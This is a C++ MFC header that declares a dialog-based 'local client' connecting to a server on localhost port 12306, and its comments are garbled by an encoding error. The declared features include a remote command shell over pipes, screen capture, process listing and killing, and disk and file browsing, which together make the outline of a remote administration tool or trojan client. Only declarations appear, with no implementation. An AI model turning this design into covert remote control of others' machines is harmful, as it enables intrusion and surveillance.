
// local-clientDlg.h : ͷ�ļ�
//

#pragma once
#include "common.h"
#include "afxwin.h"

#define MAX_BUFFER_LEN        2097152 // 2M // 8192  
#define SERVER_ADDR "127.0.0.1"
#define SERVER_PORT 12306

// CLocalClientDlg �Ի���
class CLocalClientDlg : public CDialogEx
{
// ����
public:
	CLocalClientDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
	enum { IDD = IDD_LOCALCLIENT_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
  void InitSocket();
  SOCKET m_sServer;
  CStatic m_StaticText;
  sockaddr_in m_addr;
  void SendHeartBeat();
  afx_msg void OnTimer(UINT_PTR nIDEvent);
  void CmdStart();
  HANDLE m_hCmdReadPipe ;
  HANDLE m_hCmdWritePipe ;
  HANDLE m_hReadPipe ;
  HANDLE m_hWritePipe ;
  PROCESS_INFORMATION m_pi;
  afx_msg void OnClose();
  void CmdInput(char* szBuff , DWORD nBuffLen);
  CEvent m_ScreenEvent;
  void CaptureScreen();
  CCriticalSection m_csSend;
  void GetProcess();
  void KillProcess(DWORD PID);
  void OnDiskMsg();
  void PackageDiskInfo(CString& strSend ,
                       TCHAR* szDiskName ,
                       int nIcon ,
                       TCHAR* szTypeName ,
                       ULONGLONG uReeBytes);
  void OnFileMsg(char* szDirA);
  void PackageFileInfo(CString& strSend , CString& fileName , int nIcon , int nIsDir , CString&strTime , TCHAR* szType , DWORD dwSize);
};
